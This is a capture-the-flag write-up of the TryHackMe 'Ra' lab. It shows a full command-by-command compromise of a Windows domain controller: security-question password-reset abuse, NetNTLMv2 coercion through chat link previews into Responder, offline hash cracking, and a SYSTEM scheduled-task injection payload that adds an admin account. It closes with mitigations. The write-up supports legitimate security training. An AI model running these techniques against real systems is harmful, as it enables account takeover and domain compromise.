# THM — Ra

```
██████╗  █████╗ 
██╔══██╗██╔══██╗
██████╔╝███████║
██╔══██╗██╔══██║
██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝
                       TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — a full Windows DC: DNS/Kerberos/LDAP/SMB, IIS on 80, Openfire on 9090, XMPP (5222/5223/5269…), WinRM 5985, RDP 3389
- [x] Mapped `windcorp.thm` and browsed the IIS site — a staff directory, a search bar and a self-service password reset
- [x] Scraped employee emails and noticed the profile-image filenames (`lilyleAndSparky.jpg`) leak security-question answers
- [x] Abused the reset form (`/check.asp`) with `lilyle` + her pet name `Sparky` → password reset to `ChangeMe#1234`
- [x] Confirmed `lilyle:ChangeMe#1234` over SMB/LDAP; read **Flag 1** from the `Shared` share; pulled BloodHound
- [x] Downloaded and unpacked the Spark client from `Shared`; set up Responder
- [x] Coerced `buse`'s Spark client to authenticate to Responder → NetNTLMv2 cracked to `uzunLM+3131`
- [x] `evil-winrm` as `buse`; read **Flag 2** from the Desktop
- [x] Found `C:\scripts\checkservers.ps1` running as SYSTEM, reading `C:\Users\brittanycr\hosts.txt` through `Invoke-Expression`
- [x] As `brittanycr` (Account Operators), overwrote `hosts.txt` with a user-add payload
- [x] The scheduled task created my admin account `dazzy`; `evil-winrm` as `dazzy` → read **Flag 3** as Administrator

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| curl / Caido | Scraping the site and replaying the reset request |
| NetExec (nxc) | SMB/LDAP validation, share spidering, BloodHound collection |
| smbclient | Reading the `Shared` share and writing `brittanycr`'s `hosts.txt` |
| Spark (unpacked from `Shared`) | The XMPP client used to deliver the coercion message |
| Responder | Capturing NetNTLMv2 over the Spark URL preview |
| John the Ripper | Cracking the NetNTLMv2 hashes |
| evil-winrm | Interactive shells as `buse` and `dazzy` |

---

## TL;DR

Ra is a Windows domain controller for `windcorp.thm` that hangs everything off the company chat server. The IIS site offers a **self-service password reset** whose security answers are sitting in plain sight — the employee profile-image filenames (`lilyleAndSparky.jpg`) give away the pet name. Resetting `lilyle`'s password gets a domain foothold and the first flag.

From there the path runs through the chat server itself. The `Shared` SMB share hands out the **Spark** client; Spark renders link previews, so a message containing a link back to **Responder** makes the recipient's client authenticate to me. That coercion yields `buse`'s NetNTLMv2 hash, which cracks to `uzunLM+3131` and opens a WinRM shell and the second flag.

Privilege escalation is a writable-input scheduled task: `C:\scripts\checkservers.ps1` runs as SYSTEM and feeds every line of `C:\Users\brittanycr\hosts.txt` straight into `Invoke-Expression`. `brittanycr` is in **Account Operators**, so with her credentials I overwrite that file with a `net user … /add` payload, the SYSTEM task runs it, and my new account lands in the local Administrators group — Administrator's desktop and the final flag.

---

## Introduction

`windcorp.thm` is a corporate Windows environment built around its instant-messaging platform (Openfire + the Spark client). The theme of the box is that the chat server is the weakest link: it leaks answers, it trusts its own users, and it runs a maintenance script that never should have trusted a user-writable file.

Three flags, three identities: `lilyle` (web foothold), `buse` (chat-server coercion), and a self-made admin (`dazzy`) created through a SYSTEM scheduled task.

---

## Recon

A RustScan sweep piped into Nmap shows the full fingerprint of a domain controller that also runs a chat stack:

```bash
rustscan -a 10.48.180.40 --ulimit 5000 -- -Pn -sV -sC
```

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
135/139/445  msrpc / netbios / microsoft-ds
389/636/3268/3269  ldap / ldaps  (Domain: windcorp.thm)
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
3389/tcp  open  ms-wbt-server (RDP)
5222/5223/5269/5275  jabber / XMPP (Openfire)
5985/tcp  open  http          WinRM
9090/9091 open  http          Openfire admin console (4.5.1)
```

DNS/Kerberos/LDAP/SMB say "domain controller"; ports 5222–5276 and 9090 say "Openfire + Spark". I added the domain to my hosts file:

```bash
echo "10.48.180.40  windcorp.thm fire.windcorp.thm" | sudo tee -a /etc/hosts
```

The IIS site on port 80 is a staff portal: a company directory with employee photos, a **search bar**, and a **Reset password** button. Scraping the page for addresses gives the start of a user list:

```bash
curl -s http://windcorp.thm/ | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u > emails.txt
```

The detail that matters is in the image filenames. The testimonials section serves pictures like `lilyleAndSparky.jpg`, `kirkug.jpg`, `Emilieje.jpg`. That naming is not cosmetic — `lilyleAndSparky` is the user `lilyle` plus a pet called **Sparky**, and the reset form's security questions ask for exactly that kind of answer.

---

## Foothold

The reset form (`/check.asp`) lets you pick which security question to answer, so you are not locked into "favourite pet" for everyone — but for `lilyle` the pet question is the one the site literally hands you in a filename.

The first mistake to avoid: the AD username is `lilyle`, not `lily`. Replaying the request in Caido with the right username and answer:

```http
POST /check.asp HTTP/1.1
Host: windcorp.thm
Content-Type: application/x-www-form-urlencoded

username=lilyle&question=3&secret=Sparky
```

The response resets the account and tells you the new password:

```
Your password has been reset to: ChangeMe#1234
```

That is a working domain credential. Validating it across SMB and LDAP:

```bash
nxc smb  10.48.180.40 -u lilyle -p 'ChangeMe#1234' --shares
nxc ldap 10.48.180.40 -u lilyle -p 'ChangeMe#1234' --bloodhound --collection All
```

```
SMB   10.48.180.40  445  Fire  [+] windcorp.thm\lilyle:ChangeMe#1234
```

The `Shared` share is readable and holds the first flag plus the installers for the Spark chat client:

```bash
smbclient //10.48.180.40/Shared -U 'windcorp.thm\lilyle%ChangeMe#1234' -c 'ls'
```

```
Flag 1.txt
spark_2_8_3.deb   spark_2_8_3.exe   spark_2_8_3.dmg   spark_2_8_3.tar.gz
```

**Flag 1** comes straight out of `//Shared/Flag 1.txt`. Those Spark installers are not there by accident — they are the hint for the next stage.

---

## Shell / Initial Access

Spark is the official desktop client for the Openfire server, and `lilyle`'s reset password logs straight into the chat. The relevant behaviour: Spark renders **link previews**, and the fetch for that preview is made by the *recipient's* client, authenticated as them. Point that fetch at my own listener and the recipient hands me their NetNTLMv2.

Unpack the client from the share so I have the same binary the users run:

```bash
mkdir spark_extracted && cd spark_extracted
ar x ../spark_2_8_3.deb
tar -xf data.tar.*
```

Start Responder on the VPN interface, then send a chat message to `buse` whose body is a link back to my IP. When his client previews it, it authenticates to me:

```bash
sudo responder -I tun0
```

```
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:724d1be3299322ec:D61289513B...
```

(Worth noting: the capture only fired against `buse` — his account has the client plugin that renders the preview, so this is user-by-user, not a broadcast.)

Crack it offline with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 buse.txt
```

```
uzunLM+3131      (buse)
```

`buse:uzunLM+3131` is in the Remote Management Users group, so WinRM gives an interactive shell:

```bash
evil-winrm -i 10.48.180.40 -u 'buse' -p 'uzunLM+3131'
```

**Flag 2** is on `buse`'s desktop:

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop> type "Flag 2.txt"
THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
```

---

## Escalation Path

Looking around as `buse`, the interesting thing is a maintenance script in `C:\scripts`:

```powershell
*Evil-WinRM* PS C:\scripts> Get-Content C:\scripts\checkservers.ps1
```

```powershell
$notificationto = "brittanycr@windcorp.thm"
...
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
    ForEach-Object { ... Invoke-Expression ... }
```

In plain terms: the script reads every non-comment line of `C:\Users\brittanycr\hosts.txt` and runs it through **`Invoke-Expression`**. A scheduled task runs the script, and its own ACL shows who that is:

```powershell
*Evil-WinRM* PS C:\Users\buse\Documents> icacls C:\scripts\checkservers.ps1
C:\scripts\checkservers.ps1  NT AUTHORITY\SYSTEM:(I)(F)
```

So the content of `hosts.txt` is executed **as SYSTEM**. The catch is the file lives in `brittanycr`'s profile, and `buse` can't write it:

```
C:\Users\brittanycr\hosts.txt: Access is denied.
```

That is what makes `brittanycr` the pivot. She is a member of **Account Operators** (a group that can create and modify accounts and log on to DCs), and — more simply — she owns the file the SYSTEM task trusts. With her credentials (`brittanycr:dazzy213A`, recovered through the same Spark-to-Responder coercion used for `buse`), I have write access to her own profile over SMB:

```bash
nxc smb 10.48.180.40 -u brittanycr -p 'dazzy213A' -d WINDCORP
```

```
SMB  10.48.180.40  445  Fire  [+] WINDCORP\brittanycr:dazzy213A
```

---

## Exploitation

The payload is just the two commands I want SYSTEM to run, written as `hosts.txt`. Because the script pipes each line into `Invoke-Expression`, the cleanest form is a leading `;` so the statements parse and run independently of whatever the script wraps around them:

```
;net user dazzy Password123! /add;net localgroup Administrators dazzy /add
```

Upload it over SMB as `brittanycr`, overwriting her file:

```bash
smbclient //10.48.180.40/Users -U 'WINDCORP\brittanycr'
smb: \> cd brittanycr\
smb: \brittanycr\> put hosts.txt
```

Wait for the scheduled task's next run, then log in as the account SYSTEM just created for me:

```bash
evil-winrm -i 10.48.180.40 -u 'dazzy' -p 'Password123!'
```

```
Info: Connection successful
*Evil-WinRM* PS C:\Users\dazzy\Documents>
```

`dazzy` is now in Administrators, so Administrator's desktop is readable — **Flag 3**:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type "Flag3.txt"
THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
```

---

## Rabbit Holes

**Brute-forcing the Openfire login.** The 9090 admin console is the loudest thing on the box, so my first instinct was to script logins against it (admin, administrator, `Password123`, every username I had). All dead. The reset form on the IIS site is the way in — not the Openfire console. Stop attacking the console.

**Using `lily` instead of `lilyle`.** The directory shows real names ("Lily Levesque") but the AD/reset username is `lilyle`. Every attempt with `lily` fails silently; the filename convention (`lilyle`AndSparky) is also telling you the username.

**`net user add` syntax and the first password.** My first `hosts.txt` used `net user add dazzy …` and a different password — the account never worked over WinRM. The correct syntax is `net user dazzy Password123! /add`, and the `;`-separated form is what survives `Invoke-Expression` intact. When the created account won't log in, suspect the payload's syntax before the technique.

---

## Flag

| # | Location | Value |
|---|---|---|
| 1 | `//Shared/Flag 1.txt` (as `lilyle`) | Retrieved from the readable `Shared` share |
| 2 | `C:\Users\buse\Desktop\Flag 2.txt` | `THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}` |
| 3 | `C:\Users\Administrator\Desktop\Flag3.txt` | `THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}` |

---

## Mitigations

**Never derive security answers from public data.** Pet names, maiden names and the like are weak to begin with; publishing them in image filenames (`lilyleAndSparky.jpg`) makes the reset form a login bypass. Drop knowledge-based reset entirely in favour of an out-of-band reset (email/SMS link, admin-issued token), and never echo the new password back in the HTTP response.

**Treat the chat server as an authentication surface.** Spark/Openfire link previews coerce NetNTLMv2 from any user who opens a crafted message. Disable automatic link previews, block outbound SMB/HTTP auth from workstations to untrusted hosts, and enforce SMB signing and Extended Protection so captured hashes can't be relayed.

**Never `Invoke-Expression` a user-writable file.** `checkservers.ps1` runs as SYSTEM and executes the contents of a file inside a user's profile. Any job that runs with high privilege must read only from locations that low-privileged users cannot write, parse input as data (not code), and never use `Invoke-Expression` on it at all.

**Tighten Account Operators.** It is a powerful, often-forgotten group — its members can create accounts and log on to DCs. Keep it empty in practice and grant delegated, scoped account management instead.

---

## Key Takeaway

Every stage of Ra is the system trusting input it should have treated as hostile: the reset form trusts a security answer that is printed on the website, the chat client trusts a link enough to authenticate for it, and a SYSTEM script trusts a file any user owns. Privilege boundaries don't fail at the exploit — they fail at the point where privileged code reads attacker-controlled data.

---

## If I Did It Again

Read the filenames before touching the reset form. The whole foothold is in the directory's image names — `username` + answer — and spotting the pattern first would have saved every failed `lily` attempt.

Go straight for the SYSTEM task on privilege escalation. Once `buse` is in, `C:\scripts` and a `Get-ScheduledTask` are the fastest tell; the script's `Invoke-Expression` on a profile-local file is the whole box, and the only question is which identity can write that file.

Get the payload syntax right the first time — `;net user <u> <p> /add;net localgroup Administrators <u> /add` — and confirm the account exists with `nxc smb` before burning WinRM attempts on a login that was never going to work.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-17 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
